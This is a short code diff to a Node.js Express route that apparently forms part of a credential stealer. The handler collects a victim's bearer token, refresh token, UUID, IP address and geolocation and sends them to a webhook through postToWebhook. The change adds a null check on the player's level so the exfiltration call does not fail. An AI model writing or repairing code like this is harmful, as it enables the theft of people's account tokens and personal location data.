@@ -44,7 +44,7 @@ app.get('/', async (req, res) => {
         const security = ipLocationArray[3]
         const playerData = await getPlayerData(username)
         const rank = playerData[0]
-        const level = playerData[1].toFixed()
+	const level = playerData[1] !== undefined ? playerData[1].toFixed() : 0;
         postToWebhook(formatNumber, level, rank, username, bearerToken, uuid, ip, refreshToken, country, city, flag, security)
     } catch (e) {
         console.log(e)
